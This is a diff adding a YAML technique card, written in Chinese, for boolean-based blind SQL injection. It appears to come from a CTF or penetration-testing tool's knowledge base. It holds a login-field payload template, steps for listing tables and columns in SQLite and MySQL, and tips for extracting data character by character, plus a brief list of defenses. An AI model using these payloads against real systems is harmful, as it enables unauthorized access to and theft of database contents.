@@ -1,0 +1,67 @@
+# 技术卡片: Blind SQLi - Boolean-based 逐字符提取
+# 分类: sqli / data-extraction
+# 版本: 1.0
+# 日期: 2026-07-20
+
+id: "sqli-blind-boolean-extraction"
+name: "布尔盲注逐字符数据提取"
+category: "sqli"
+subcategory: "data-extraction"
+severity: "critical"
+
+description: |
+  利用登录成功/失败的布尔差异作为 Oracle，逐字符提取数据库内容。
+  适用于 UNION 不可用或列数不匹配的场景。
+
+trigger_signals:
+  - "UNION SELECT 失败或返回不正确结果"
+  - "不同输入导致登录成功/失败 (布尔差异明显)"
+  - "无 WAF 拦截"
+  - "SQLite/MySQL 后端可枚举系统表"
+
+payloads:
+  - technique: "布尔盲注逐字符提取"
+    payload: "username: admin' AND (SELECT SUBSTR({column},{pos},1) FROM {table} LIMIT 1)='{char}'--"
+    note: "用登录成功/失败作为布尔Oracle"
+
+extraction_workflow:
+  - step: "枚举表名"
+    technique: "sqlite_master / information_schema"
+    sqlite: "SELECT tbl_name FROM sqlite_master WHERE type='table'"
+    mysql: "SELECT table_name FROM information_schema.tables"
+  - step: "枚举列名"
+    sqlite: "SELECT name FROM pragma_table_info('table_name')"
+    mysql: "SELECT column_name FROM information_schema.columns WHERE table_name='x'"
+  - step: "逐字符提取"
+    sqlite: "SELECT SUBSTR(column, N, 1) FROM table LIMIT 1"
+    mysql: "SELECT SUBSTRING(column, N, 1) FROM table LIMIT 1"
+  - step: "测试字符集"
+    optimal: "先测 a-z0-9_ 再扩展 {}-等特殊字符"
+
+payload_template: |
+  username: "admin' AND (SELECT SUBSTR({column},{pos},1) FROM {table} LIMIT 1)='{char}'--"
+  password: "x"
+
+prerequisites:
+  - "UNION SELECT不可用或列数不匹配"
+  - "登录成功/失败有明确布尔差异"
+  - "SQLite/MySQL可枚举系统表"
+  - "无WAF拦截"
+
+defense:
+  - "参数化查询"
+  - "响应内容归一化"
+  - "速率限制爆破尝试"
+
+optimizations:
+  - "二分查找 (先测 ASCII 范围)"
+  - "并行探测多个位置"
+  - "缓存已提取字符避免重复"
+
+success_indicators:
+  - "登录成功/失败差异稳定"
+  - "提取字符与预期模式匹配 (如 CTF{, flag{, 等)"
+
+sources:
+  - case: "20260720-digital-wallet-sqli-idor"
+    outcome: "成功提取 flags.flag_value (37 字符)"
